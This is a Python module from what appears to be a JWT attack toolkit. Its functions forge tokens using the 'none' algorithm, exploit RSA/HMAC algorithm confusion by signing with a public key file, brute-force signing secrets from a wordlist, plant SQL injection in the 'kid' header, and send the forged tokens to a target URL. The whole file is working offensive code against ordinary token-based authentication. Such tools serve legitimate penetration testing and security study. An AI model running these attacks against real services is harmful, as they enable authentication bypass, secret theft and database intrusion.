import json

import click
import requests

from MyJWT.Exception import InvalidJWT
from MyJWT.modifyJWT import changeAlg, signature
from MyJWT.utils import jwtToJson, encodeJwt, isValidJwt, HEADER


def noneVulnerability(jwt):
    """
    Check none Vulnerability.

    :param str jwt: your jwt
    :return: new jwt
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = changeAlg(jwtToJson(jwt), "none")
    return encodeJwt(jwtJson) + "."


def confusionRsaHmac(jwt, filename):
    """
    Check rsa/hmac confusion.

    :param str jwt: your jwt
    :param str filename: path file
    :return: new jwt
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = changeAlg(jwtToJson(jwt), "HS256")
    return signature(jwtJson, open(filename).read())


def bruteforceDict(jwt, fileName):
    """
    Crack your jwt

    :param str jwt: your jwt
    :param str fileName: path file
    :return: key cracked or "" if key not found
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    with open(fileName, 'r') as file:
        allPassword = [line.rstrip() for line in file]
    file.close()
    for password in allPassword:
        newJwt = signature(jwtJson, password)
        newSig = newJwt.split('.')[2]
        if newSig == jwt.split('.')[2]:
            return password
    return ""


def injectSqlKid(jwt, injection):
    """
    Inject sql to your jwt

    :param str jwt: your jwt
    :param str injection: your injection
    :return: new jwt
    :rtype: str

    :raise InvalidJWT: if your jwt is not valid
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    jwtJson[HEADER]["kid"] = injection
    return signature(jwtJson, "")


def sendJwtToUrl(url, method, data, cookies, jwt):
    """
    Send requests to your url.

    :param str url: your url
    :param str method: method (GET, POST, etc.....)
    :param dict data: json to send
    :param dict cookies: cookies to send
    :param str jwt: your jwt
    :return: Response
    :rtype: requests.Response
    """
    if method == "POST":
        return requests.post(url, json=data, headers={"Authorization": "Bearer " + jwt}, cookies=cookies)

    return requests.request(method=method, url=url, json=data, cookies=cookies)


def printDecoded(jwt):
    """
    Print your jwt.

    :param str jwt: your jwt
    :return:
    """
    if not isValidJwt(jwt):
        raise InvalidJWT("Invalid JWT format")

    jwtJson = jwtToJson(jwt)
    click.echo("Header: " + json.dumps(jwtJson['header']))
    click.echo("Payload: " + json.dumps(jwtJson['payload']))
    click.echo("Signature: " + json.dumps(jwtJson['signature']))
